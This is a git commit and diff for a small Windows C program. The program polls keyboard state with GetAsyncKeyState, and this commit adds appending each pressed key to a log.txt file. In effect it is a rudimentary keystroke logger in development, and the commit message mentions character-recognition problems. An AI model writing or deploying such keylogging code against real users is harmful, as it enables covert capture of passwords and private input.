3cd7a3cbd58e07b961109d4c67760118fab77a85
ivanmustdie <h3005972@mvrht.com>
2016-10-28 22:44:34 +0200

    File writing
    Added basic file writing. Character recognition seems to cause some
    problems.

--- main.c
+++ main.c
@@ -7,19 +7,26 @@ int main()
 {
     printf("Hello world!\n");
     int running = 1;
+    FILE *fp;
+
+    fp = fopen("log.txt","a");
+    fprintf(fp,"testing");
+
     while(running){
         Sleep(10);
         for(int ch= 8;ch<=222;ch++){
 
             if((GetAsyncKeyState(ch)& 0x8000!=0)){
-                printf("You pressed %c \n",ch);
+                printf("You pressed %i \n",ch);
+                //fprintf(fp,ch);
+                fputc(ch,fp);
                 if(ch == 27){
                     running = 0;
                 }
             }
         }
     }
-
+    fclose(fp);
     getchar();
     return 0;
 }
